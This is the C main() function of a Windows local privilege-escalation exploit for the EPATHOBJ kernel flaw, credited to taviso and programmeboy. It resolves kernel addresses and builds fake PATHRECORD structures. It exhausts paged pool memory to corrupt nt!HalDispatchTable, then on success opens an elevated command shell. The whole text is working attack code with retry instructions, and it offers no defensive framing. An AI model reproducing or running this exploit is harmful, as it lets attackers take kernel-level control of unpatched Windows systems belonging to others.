int main(int argc, char **argv)
{
    HANDLE               Thread;
    HDC                  Device;
    ULONG                Size;
    ULONG                PointNum;
    HMODULE              KernelHandle;
    PULONG               DispatchRedirect;
    PULONG               Interval;
    ULONG                SavedInterval;
    RTL_PROCESS_MODULES  ModuleInfo;

    LogMessage(L_INFO, "\r--------------------------------------------------\n"
                       "\rWindows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit\n"
                       "\r------------------- taviso () cmpxchg8b com, programmeboy () gmail com ---\n"
                       "\n");

    NtQueryIntervalProfile    = GetProcAddress(GetModuleHandle("ntdll"), "NtQueryIntervalProfile");
    NtQuerySystemInformation  = GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    Mutex                     = CreateMutex(NULL, FALSE, NULL);
    DispatchRedirect          = (PVOID) HalDispatchRedirect;
    Interval                  = (PULONG) ShellCode;
    SavedInterval             = Interval[0];
    TargetPid                 = GetCurrentProcessId();

    LogMessage(L_INFO, "NtQueryIntervalProfile () %p", NtQueryIntervalProfile);
    LogMessage(L_INFO, "NtQuerySystemInformation () %p", NtQuerySystemInformation);

    // Lookup the address of system modules.
    NtQuerySystemInformation(SystemModuleInformation,
                             &ModuleInfo,
                             sizeof ModuleInfo,
                             NULL);

    LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s () %p",
                        ModuleInfo.Modules[0].FullPathName,
                        ModuleInfo.Modules[0].ImageBase);

    // Lookup some system routines we require.
    KernelHandle                = LoadLibrary(ModuleInfo.Modules[0].FullPathName + ModuleInfo.Modules[0].OffsetToFileName);
    HalDispatchTable            = (ULONG) GetProcAddress(KernelHandle, "HalDispatchTable")           - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsInitialSystemProcess      = (ULONG) GetProcAddress(KernelHandle, "PsInitialSystemProcess")     - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsReferencePrimaryToken     = (ULONG) GetProcAddress(KernelHandle, "PsReferencePrimaryToken")    - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;
    PsLookupProcessByProcessId  = (ULONG) GetProcAddress(KernelHandle, "PsLookupProcessByProcessId") - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;

    // Search for a ret instruction to install in the damaged HalDispatchTable.
    HalQuerySystemInformation   = (ULONG) memchr(KernelHandle, 0xC3, ModuleInfo.Modules[0].ImageSize)
                                - (ULONG) KernelHandle
                                + (ULONG) ModuleInfo.Modules[0].ImageBase;

    LogMessage(L_INFO, "Discovered a ret instruction at %p", HalQuerySystemInformation);

    // Create our PATHRECORD in user space we will get added to the EPATHOBJ
    // pathrecord chain.
    PathRecord = VirtualAlloc(NULL,
                              sizeof *PathRecord,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);

    LogMessage(L_INFO, "Allocated userspace PATHRECORD () %p", PathRecord);

    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
    // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite
    // loop in EPATHOBJ::bFlatten().
    PathRecord->flags   = 0;
    PathRecord->next    = PathRecord;
    PathRecord->prev    = (PPATHRECORD)(0x42424242);

    LogMessage(L_INFO, "  ->next  @ %p", PathRecord->next);
    LogMessage(L_INFO, "  ->prev  @ %p", PathRecord->prev);
    LogMessage(L_INFO, "  ->flags @ %u", PathRecord->flags);

    // Now we need to create a PATHRECORD at an address that is also a valid
    // x86 instruction, because the pointer will be interpreted as a function.
    // I've created a list of candidates in DispatchRedirect.
    LogMessage(L_INFO, "Searching for an available stub address...");

    // I need to map at least two pages to guarantee the whole structure is
    // available.
    while (!VirtualAlloc(*DispatchRedirect & ~(PAGE_SIZE - 1),
                         PAGE_SIZE * 2,
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE)) {

        LogMessage(L_WARN, "\tVirtualAlloc(%#x) => %#x",
                            *DispatchRedirect & ~(PAGE_SIZE - 1),
                            GetLastError());

        // This page is not available, try the next candidate.
        if (!*++DispatchRedirect) {
            LogMessage(L_ERROR, "No redirect candidates left, sorry!");
            return 1;
        }
    }

    LogMessage(L_INFO, "Success, ExploitRecordExit () %#0x", *DispatchRedirect);

    // This PATHRECORD must terminate the list and recover.
    ExploitRecordExit           = (PPATHRECORD) *DispatchRedirect;
    ExploitRecordExit->next     = NULL;
    ExploitRecordExit->prev     = NULL;
    ExploitRecordExit->flags    = PD_BEGINSUBPATH;
    ExploitRecordExit->count    = 0;

    LogMessage(L_INFO, "  ->next  @ %p", ExploitRecordExit->next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecordExit->prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecordExit->flags);

    // This is the second stage PATHRECORD, which causes a fresh PATHRECORD
    // allocated from newpathrec to nt!HalDispatchTable. The Next pointer will
    // be copied over to the new record. Therefore, we get
    //
    // nt!HalDispatchTable[1] = &ExploitRecordExit.
    //
    // So we make &ExploitRecordExit a valid sequence of instuctions here.
    LogMessage(L_INFO, "ExploitRecord () %#0x", &ExploitRecord);

    ExploitRecord.next          = (PPATHRECORD) *DispatchRedirect;
    ExploitRecord.prev          = (PPATHRECORD) &HalDispatchTable[1];
    ExploitRecord.flags         = PD_BEZIERS | PD_BEGINSUBPATH;
    ExploitRecord.count         = 4;

    LogMessage(L_INFO, "  ->next  @ %p", ExploitRecord.next);
    LogMessage(L_INFO, "  ->prev  @ %p", ExploitRecord.prev);
    LogMessage(L_INFO, "  ->flags @ %u", ExploitRecord.flags);

    LogMessage(L_INFO, "Creating complex bezier path with %x", (ULONG)(PathRecord) >> 4);

    // Generate a large number of Belier Curves made up of pointers to our
    // PATHRECORD object.
    for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
        PointTypes[PointNum]    = PT_BEZIERTO;
    }

    // Switch to a dedicated desktop so we don't spam the visible desktop with
    // our Lines (Not required, just stops the screen from redrawing slowly).
    SetThreadDesktop(CreateDesktop("DontPanic",
                                   NULL,
                                   NULL,
                                   0,
                                   GENERIC_ALL,
                                   NULL));

    // Get a handle to this Desktop.
    Device = GetDC(NULL);

    // Take ownership of Mutex
    WaitForSingleObject(Mutex, INFINITE);

    // Spawn a thread to cleanup
    Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);

    LogMessage(L_INFO, "Begin CreateRoundRectRgn cycle");

    // We need to cause a specific AllocObject() to fail to trigger the
    // exploitable condition. To do this, I create a large number of rounded
    // rectangular regions until they start failing. I don't think it matters
    // what you use to exhaust paged memory, there is probably a better way.
    //
    // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
    // failure. Seriously, do some damn QA Microsoft, wtf.
    for (Size = 1 << 26; Size; Size >>= 1) {
        while (Regions[NumRegion] = CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
            NumRegion++;
    }

    LogMessage(L_INFO, "Allocated %u HRGN objects", NumRegion);

    LogMessage(L_INFO, "Flattening curves...");

    for (PointNum = MAX_POLYPOINTS; PointNum && !Finished; PointNum -= 3) {
        BeginPath(Device);
        PolyDraw(Device, Points, PointTypes, PointNum);
        EndPath(Device);
        FlattenPath(Device);
        FlattenPath(Device);

        // Test if exploitation succeeded.
        NtQueryIntervalProfile(ProfileTotalIssues, Interval);

        // Repair any damage.
        *Interval = SavedInterval;

        EndPath(Device);
    }

    if (Finished) {
        LogMessage(L_INFO, "Success, launching shell...", Finished);
        ShellExecute(NULL, "open", "cmd", NULL, NULL, SW_SHOW);
        LogMessage(L_INFO, "Press any key to exit...");
        getchar();
        ExitProcess(0);
    }

    // If we reach here, we didn't trigger the condition. Let the other thread know.
    ReleaseMutex(Mutex);
    WaitForSingleObject(Thread, INFINITE);
    ReleaseDC(NULL, Device);

    // Try again...
    LogMessage(L_ERROR, "No luck, run exploit again (it can take several attempts)");
    LogMessage(L_INFO, "Press any key to exit...");
    getchar();
    ExitProcess(1);
}